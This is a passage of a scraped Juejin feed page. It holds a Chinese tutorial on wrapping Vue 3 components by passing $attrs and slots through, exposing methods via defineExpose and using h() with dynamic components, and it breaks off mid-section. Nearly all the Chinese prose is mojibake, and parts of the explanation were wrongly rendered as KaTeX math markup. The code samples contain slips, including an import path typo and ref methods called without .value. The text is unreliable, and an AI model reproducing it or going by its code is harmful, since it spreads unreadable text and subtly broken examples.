ä¼šå¯¹AIäº§ç”Ÿæƒ…æ„Ÿä¾èµ–å—ï¼Ÿé¢å¯¹AIè¢«ç”¨äºè¯ˆéª—ç­‰è¿æ³•è¡Œä¸ºï¼Œåˆè¯¥å¦‚ä½•é˜²èŒƒï¼Ÿå¿«æ¥è¯„è®ºåŒºè¯´è¯´ä½ çš„çœ‹æ³•å§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue3ç»„ä»¶äºŒæ¬¡å°è£…-å¦å¤–ä¸€ç§æ€è·¯]]></title>    <link>https://juejin.cn/post/7582246395986821154</link>    <guid>https://juejin.cn/post/7582246395986821154</guid>    <pubDate>2025-12-11T07:40:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582246395986821154" data-draft-id="7582232741686853667" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue3ç»„ä»¶äºŒæ¬¡å°è£…-å¦å¤–ä¸€ç§æ€è·¯"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-11T07:40:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æµ·å°”æ™ºæ…§å®¶æŠ€æœ¯å¹³å°"/> <meta itemprop="url" content="https://juejin.cn/user/3848721122725016"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue3ç»„ä»¶äºŒæ¬¡å°è£…-å¦å¤–ä¸€ç§æ€è·¯
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/7156434854350389283/posts" data-v-d326b38e=""><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a4176c1a2e0b4e1b986f105126840cc9~tplv-k3u1fbpfcp-watermark.image?" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/7156434854350389283/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="ä¸‰ç¿¼é¸Ÿæ•°å­—åŒ–æŠ€æœ¯å›¢é˜Ÿ" class="title" data-v-d326b38e="">ä¸‰ç¿¼é¸Ÿæ•°å­—åŒ–æŠ€æœ¯å›¢é˜Ÿ</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2025-12-11T07:40:39.000Z" title="Thu Dec 11 2025 07:40:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2025-12-11
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                é˜…è¯»3åˆ†é’Ÿ
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        å…³æ³¨
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              @æµ·å°”ä¼˜å®¶æ™ºèƒ½ç§‘æŠ€ï¼ˆåŒ—äº¬ï¼‰æœ‰é™å…¬å¸
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å‰ç«¯å¼€å‘ä¸­ï¼ŒäºŒæ¬¡å°è£…ç¬¬ä¸‰æ–¹ç»„ä»¶ååˆ†å¸¸è§ã€‚å½“ç°æœ‰çš„ç¬¬ä¸‰æ–¹ç»„ä»¶æ— æ³•å®Œå…¨æ»¡è¶³é¡¹ç›®éœ€æ±‚æ—¶ï¼Œæˆ‘ä»¬ä¼šå¯¹å…¶è¿›è¡Œå®šåˆ¶åŒ–å°è£…ï¼Œä»¥å¢å¼ºåŠŸèƒ½ã€ç®€åŒ–ç”¨æ³•æˆ–é€‚é…ç‰¹å®šä¸šåŠ¡åœºæ™¯ã€‚ç›¸ä¿¡å¤§å®¶åœ¨ä½¿ç”¨vue3è¿›è¡Œå¼€å‘æ—¶ï¼Œéƒ½æœ‰äºŒæ¬¡å°è£…ç»éªŒã€‚æœ€è¿‘åœ¨ä¸€æ¬¡å­¦ä¹ ä¸­ï¼Œçœ‹åˆ°äº†ä¸€ç§è®©æˆ‘çœ¼å‰ä¸€äº®çš„äºŒæ¬¡å°è£…çš„æ–¹å¼ï¼Œä¸‹é¢è·Ÿå¤§å®¶åˆ†äº«ä¸€ä¸‹ã€‚</p>
<h2 data-id="heading-0">1. å¦‚ä½•å°è£…ç»„ä»¶</h2>
<p>åœ¨å°è£…ä¸€ä¸ªç»„ä»¶å‰ï¼Œæˆ‘ä»¬è¦æ€è€ƒä¸€äº›é—®é¢˜ï¼š</p>
<ul>
<li>propså¦‚ä½•é€ä¼ ç»™ç¬¬ä¸‰æ–¹ç»„ä»¶</li>
<li>æ’æ§½å¦‚ä½•é€ä¼ ç»™ç¬¬ä¸‰æ–¹ç»„ä»¶</li>
<li>ç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ–¹æ³•å¦‚ä½•æš´éœ²å‡ºå»</li>
</ul>
<h2 data-id="heading-1">2. é€ä¼ props</h2>
<p>vue3çš„ç»„ä»¶å®ä¾‹æœ‰ä¸ªå¯¹è±¡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi>s</mi><mtext>ï¼ŒåŒ…å«äº†ç»„ä»¶æ‰€æœ‰é€ä¼ </mtext><mi>a</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>b</mi><mi>u</mi><mi>t</mi><mi>e</mi><mi>s</mi><mtext>ã€‚ä¸ä»…åŒ…å«</mtext><mi>p</mi><mi>r</mi><mi>o</mi><mi>p</mi><mi>s</mi><mtext>ï¼Œ</mtext><mi>v</mi><mo>âˆ’</mo><mi>o</mi><mi>n</mi><mtext>äº‹ä»¶ç›‘å¬å™¨ï¼Œè¿˜æœ‰</mtext><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mtext>ï¼Œ</mtext><mi>s</mi><mi>t</mi><mi>y</mi><mi>l</mi><mi>e</mi><mtext>ï¼Œ</mtext><mi>i</mi><mi>d</mi><mtext>ç­‰ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡</mtext><mi>v</mi><mo>âˆ’</mo><mi>b</mi><mi>i</mi><mi>n</mi><mi>d</mi><mtext>ï¼Œä¼ é€’</mtext></mrow><annotation encoding="application/x-tex">attrsï¼ŒåŒ…å«äº†ç»„ä»¶æ‰€æœ‰é€ä¼  attributesã€‚ä¸ä»…åŒ…å«propsï¼Œv-onäº‹ä»¶ç›‘å¬å™¨ï¼Œè¿˜æœ‰classï¼Œstyleï¼Œidç­‰ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡v-bindï¼Œä¼ é€’</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">a</span><span class="mord mathnormal">tt</span><span class="mord mathnormal">rs</span><span class="mord cjk_fallback">ï¼ŒåŒ…å«äº†ç»„ä»¶æ‰€æœ‰é€ä¼ </span><span class="mord mathnormal">a</span><span class="mord mathnormal">tt</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ib</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mord cjk_fallback">ã€‚ä¸ä»…åŒ…å«</span><span class="mord mathnormal">p</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">p</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">äº‹ä»¶ç›‘å¬å™¨ï¼Œè¿˜æœ‰</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">ss</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">ç­‰ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">bin</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">ï¼Œä¼ é€’</span></span></span></span></span>attrsç»™ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œæ¥å®ç°é€ä¼ propsçš„ç›®çš„ã€‚ä¸‹é¢ä»¥vant-ui çš„popupä¸ºä¾‹ï¼Œåšä¸€ä¸ªäºŒæ¬¡å°è£…ã€‚</p>
<pre><code class="hljs language-xml" lang="xml">// myPopup.vue
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>è‡ªå·±å°è£…çš„popup,ä¸€äº›è‡ªå®šä¹‰å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">van-popup</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">van-popup</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>Ã
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

// App.vue
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">my-popup</span>
      <span class="hljs-attr">v-model:show</span>=<span class="hljs-string">"isShow"</span>
      <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ padding: '0px', borderRadius: '12px' }"</span>
      <span class="hljs-attr">position</span>=<span class="hljs-string">"bottom"</span>
      <span class="hljs-attr">:round</span>=<span class="hljs-string">"true"</span>
      &gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">my-popup</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MyPopup</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./myPopop.vue'</span>
<span class="hljs-keyword">const</span> isShow = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">true</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>è¿™æ ·ï¼Œåœ¨App.vueé‡Œä¼ é€’çš„å‚æ•°ï¼Œéƒ½å¯ä»¥é€ä¼ ç»™ <em/></p>
<h2 data-id="heading-2">3. æ’æ§½æ€ä¹ˆä¼ </h2>
<p>æˆ‘ä»¬æƒ³åˆ°vue3ç»„ä»¶å®ä¾‹æœ‰<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>l</mi><mi>o</mi><mi>t</mi><mi>s</mi><mo separator="true">,</mo><mtext>é€šè¿‡éå†</mtext></mrow><annotation encoding="application/x-tex">slots,é€šè¿‡éå†</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord cjk_fallback">é€šè¿‡éå†</span></span></span></span></span>slots,é€ä¼ ç»™ç¬¬ä¸‰æ–¹ç»„ä»¶ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml">// myPopup.vue
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>è‡ªå·±å°è£…çš„popup,ä¸€äº›è‡ªå®šä¹‰å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">van-popup</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(slot, name) in $slots"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"name"</span> #[<span class="hljs-attr">name</span>]=<span class="hljs-string">"slotsProps"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">:name</span>=<span class="hljs-string">"name"</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"slotsProps"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">van-popup</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>Ã
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-3">4. ç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ–¹æ³•å¦‚ä½•æš´éœ²å‡ºå»</h2>
<p>ä¸€èˆ¬åœ¨vue3ä¸­ï¼Œå­ç»„ä»¶é€šè¿‡defineExposeæš´éœ²æ–¹æ³•ç»™çˆ¶ç»„ä»¶ï¼Œæ‰€ä»¥é€šè¿‡defineExposeå¯ä»¥æŠŠç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ–¹æ³•ä¸€ä¸ªä¸ªæš´éœ²å‡ºå»ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>è‡ªå·±å°è£…çš„popup,ä¸€äº›è‡ªå®šä¹‰å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">van-popup</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"popupRef"</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"$attrs"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(slot, name) in $slots"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">:name</span>=<span class="hljs-string">"name"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">slot</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">van-popup</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>Ã
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">const</span> popupRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-title function_">defineExpose</span>({
  <span class="hljs-title function_">close</span>(<span class="hljs-params"/>) {
      popupRef.<span class="hljs-property">value</span>.<span class="hljs-title function_">close</span>()
  },
  <span class="hljs-title function_">open</span>(<span class="hljs-params"/>){ 
      popupRef.<span class="hljs-title function_">open</span>()
  },
  <span class="hljs-title function_">click</span>(<span class="hljs-params"/>){ 
      popupRef.<span class="hljs-title function_">click</span>()
  }
  <span class="hljs-comment">// è¿™é‡Œå°±ä¸ä¸€ä¸€å†™å‡ºæ¥äº†</span>
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>è¿™æ ·å†™å½“ç„¶æ²¡æœ‰é—®é¢˜ï¼Œé‚£æœ‰æ²¡æœ‰æ›´ç®€å•çš„æ–¹æ³•å‘¢ï¼Ÿä¸‹é¢æˆ‘å°†ä¸ºå¤§å®¶æä¾›å¦å¤–ä¸€ä¸ªç§å°è£…ç»„ä»¶çš„æ€è·¯ï¼Œå¯ä»¥è®©ä»£ç çœ‹èµ·æ¥æ›´ç®€æ´ã€‚</p>
<h2 data-id="heading-4">5. åŠ¨æ€ç»„ä»¶</h2>
<p>å¤§å®¶åœ¨å†™è·¯ç”±æ—¶ï¼Œç»å¸¸ä¼šç”¨åˆ°åŠ¨æ€ç»„ä»¶<code>&lt;component&gt;</code>ï¼Œè¦æ¸²æŸ“çš„å®é™…ç»„ä»¶ç”± <code>is</code> prop å†³å®šã€‚è¢«ä¼ ç»™ <code>:is</code> çš„å€¼å¯ä»¥æ˜¯è¢«æ³¨å†Œçš„ç»„ä»¶åæˆ–è€…å¯¼å…¥çš„ç»„ä»¶å¯¹è±¡ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ç§æ–¹å¼ï¼Œå°±æ˜¯vnodeå³è™šæ‹Ÿdomã€‚è€Œåœ¨vueä¸­ï¼Œè™šæ‹ŸèŠ‚ç‚¹ç”±hå‡½æ•°åˆ›å»ºï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç®€å•çœ‹ä¸€ä¸‹è™šæ‹Ÿå‡½æ•°hçš„ç”¨æ³•ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">h</span>(
    <span class="hljs-comment">// å¿…é€‰ï¼šç»„ä»¶åã€ç»„ä»¶å¯¹è±¡æˆ–æ ‡ç­¾å</span>
    <span class="hljs-string">'div'</span> | Component,
    
    <span class="hljs-comment">// å¯é€‰ï¼šæ•°æ®å¯¹è±¡ï¼ˆåŒ…å« propsã€attrsã€classã€style ç­‰ï¼‰</span>
    {
        props: { ... },
        attrs: { ... },
        on: { click: () =&gt; {} },
        <span class="hljs-attribute">class</span>: { ... },
        <span class="hljs-attribute">style</span>: { ... }
     },
     
     <span class="hljs-comment">// å¯é€‰ï¼šå­èŠ‚ç‚¹ï¼ˆå­—ç¬¦ä¸²ã€æ•°ç»„æˆ–å…¶ä»– VNodeï¼‰</span>
     <span class="hljs-string">'Hello'</span> | [<span class="hljs-built_in">h</span>(<span class="hljs-string">'span'</span>, <span class="hljs-string">'World'</span>)] | ...
);
</code></pre>
<p>vueå®˜æ–¹æ–‡æ¡£çš„ä»‹ç»ï¼š</p>
<pre><code class="hljs language-php" lang="php">
<span class="hljs-comment">// å®Œæ•´å‚æ•°ç­¾å</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h</span>(<span class="hljs-params">
  type: <span class="hljs-keyword">string</span> | Component,
  props?: <span class="hljs-keyword">object</span> | <span class="hljs-literal">null</span>,
  children?: Children | Slot | Slots
</span>): <span class="hljs-title">VNode</span>
</span></code></pre>
<p>hå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç»„ä»¶åã€ç»„ä»¶å¯¹è±¡æˆ–æ ‡ç­¾åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦ä¼ é€’ç»™ç»„ä»¶çš„propsï¼Œå±æ€§ï¼Œäº‹ä»¶ï¼Œchassç­‰ç­‰ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å­èŠ‚ç‚¹ã€‚å‰ä¸¤ä¸ªå‚æ•°å¾ˆå¥½ç†è§£ï¼Œæˆ‘ä»¬æ¥é‡ç‚¹å…³æ³¨ä¸€ä¸‹ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥ä¼ æ’æ§½ã€‚ä¸Šé¢æˆ‘ä»¬é€ä¼ æ’æ§½æ—¶ç”¨æ˜¯çš„forå¾ªç¯éå†<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>l</mi><mi>o</mi><mi>t</mi><mi>s</mi><mtext>ï¼Œè€Œåœ¨ä½¿ç”¨</mtext><mi>h</mi><mtext>å‡½æ•°æ—¶ï¼Œ</mtext></mrow><annotation encoding="application/x-tex">slotsï¼Œè€Œåœ¨ä½¿ç”¨hå‡½æ•°æ—¶ï¼Œ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord 